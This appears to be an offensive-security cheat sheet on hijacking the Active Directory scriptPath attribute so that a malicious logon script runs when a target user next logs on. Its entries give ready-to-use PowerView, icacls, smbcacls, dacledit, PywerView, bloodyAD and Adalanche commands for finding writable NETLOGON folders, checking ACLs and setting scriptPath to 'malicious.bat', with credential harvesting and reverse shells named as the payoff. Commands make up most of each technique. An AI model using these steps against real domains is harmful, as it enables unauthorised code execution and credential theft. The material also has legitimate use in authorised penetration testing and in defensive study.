# Logon Script Abuse (scriptPath Hijacking)

> **Pre-req:** `source /opt/venvTools/bin/activate`

## Overview
Abuse `GenericWrite`/`GenericAll` over a user to set or modify their `scriptPath` attribute, pointing to a malicious script in NETLOGON. The script executes at next logon.

## Enumeration

### Check scriptPath and NETLOGON Permissions [added: 2026-04]
- **Tags:** #scriptPath #NETLOGON #LogonScript #PowerView #smbcacls #ACLEnum #T1037.001
- **Trigger:** GenericWrite/GenericAll on a user identified; looking for logon script abuse paths
- **Prereq:** Valid domain credentials; read access to NETLOGON share
- **Yields:** Current scriptPath settings and NETLOGON write permissions for script injection
- **Opsec:** Low
- **Context:** Verify if target has a scriptPath set and check write access to NETLOGON share
- **Payload/Method:**
  ```powershell
  # PowerView — get current scriptPath
  Get-DomainObject <TARGET_USER> -Properties scriptPath

  # List NETLOGON contents
  ls $env:LOGONSERVER\NETLOGON

  # Check folder permissions
  icacls $env:LOGONSERVER\NETLOGON\<DIR>
  ```
  ```bash
  # Linux — check ACLs on NETLOGON directory
  smbcacls //<DC_IP>/NETLOGON <DIR> -U <USER>%'<PASSWORD>'
  ```

### Discover Misconfigured Logon Scripts (ScriptSentry) [added: 2026-04]
- **Tags:** #ScriptSentry #LogonScript #Misconfiguration #WritableScript #AutoDiscovery #T1037.001
- **Trigger:** Need automated discovery of writable or misconfigured logon scripts domain-wide
- **Prereq:** Domain-joined Windows host; PowerShell execution
- **Yields:** List of writable/misconfigured logon scripts across the domain
- **Opsec:** Low
- **Context:** Automated discovery of writable or misconfigured logon scripts across the domain
- **Payload/Method:**
  ```powershell
  .\Invoke-ScriptSentry.ps1
  ```

### ACL Enumeration for scriptPath Write [added: 2026-04]
- **Tags:** #dacledit #PywerView #ACLEnum #scriptPath #WriteProperty #GenericWrite #T1222
- **Trigger:** Need to verify if current user can write scriptPath on a target user
- **Prereq:** Valid domain credentials; dacledit or PywerView tools
- **Yields:** Confirmation of write access to scriptPath attribute on target user
- **Opsec:** Low
- **Context:** Check if current user can write scriptPath on a target
- **Payload/Method:**
  ```bash
  # dacledit from Linux
  python3 examples/dacledit.py -principal '<USER>' -target '<TARGET_USER>' -dc-ip <DC_IP> <DOMAIN>/<USER>:<PASSWORD>

  # PywerView from Linux
  pywerview get-objectacl --name '<TARGET_USER>' -w <DOMAIN> -t <DC_IP> -u '<USER>' -p '<PASSWORD>' --resolve-sids --resolve-guids
  ```

## Exploitation

### Set scriptPath — Windows (PowerView) [added: 2026-04]
- **Tags:** #scriptPath #PowerView #LogonScriptAbuse #GenericWrite #SetDomainObject #T1037.001
- **Trigger:** GenericWrite confirmed on target user; writable NETLOGON folder identified
- **Prereq:** GenericWrite over target user; write access to NETLOGON subfolder; malicious script staged
- **Yields:** Code execution as target user at next logon (credential harvesting, reverse shell)
- **Opsec:** Med
- **Context:** Have GenericWrite over target user — set scriptPath to malicious script in writable NETLOGON folder
- **Payload/Method:**
  ```powershell
  Set-DomainObject <TARGET_USER> -Set @{'scriptPath'='<NETLOGON_SUBDIR>\malicious.bat'}
  ```

### Set scriptPath — Linux (bloodyAD) [added: 2026-04]
- **Tags:** #scriptPath #bloodyAD #LogonScriptAbuse #LinuxAttack #GenericWrite #T1037.001
- **Trigger:** GenericWrite confirmed on target user; attacking from Linux
- **Prereq:** GenericWrite over target user; bloodyAD tool; write access to NETLOGON
- **Yields:** Code execution as target user at next logon (Linux-based attack path)
- **Opsec:** Med
- **Context:** Same attack from Linux using bloodyAD
- **Payload/Method:**
  ```bash
  # Set scriptPath
  bloodyAD --host "<DC_IP>" -d "<DOMAIN>" -u "<USER>" -p '<PASSWORD>' set object <TARGET_USER> scriptPath -v '<NETLOGON_SUBDIR>\malicious.bat'

  # Verify
  bloodyAD --host "<DC_IP>" -d "<DOMAIN>" -u "<USER>" -p '<PASSWORD>' get object <TARGET_USER> --attr scriptPath
  ```

## AD Visualization

### Adalanche — Graph-based Attack Path Discovery [added: 2026-04]
- **Tags:** #Adalanche #AttackPath #ADVisualization #GraphAnalysis #scriptPathAbuse #T1087.002
- **Trigger:** Need to visualize AD relationships and find scriptPath or other abuse paths
- **Prereq:** Valid domain credentials; Adalanche binary; network access to DC
- **Yields:** Interactive browser-based graph of AD attack paths including ACL chains
- **Opsec:** Med
- **Context:** Collect and visualize AD relationships to find scriptPath and other abuse paths
- **Payload/Method:**
  ```bash
  # Collect AD data
  ./adalanche-linux-x64-v<VERSION> collect activedirectory --domain <DOMAIN> --server <DC_IP> --username '<USER>' --password '<PASSWORD>'

  # Launch interactive analyzer (browser-based)
  ./adalanche-linux-x64-v<VERSION> analyze --datapath <DATAPATH>
  ```
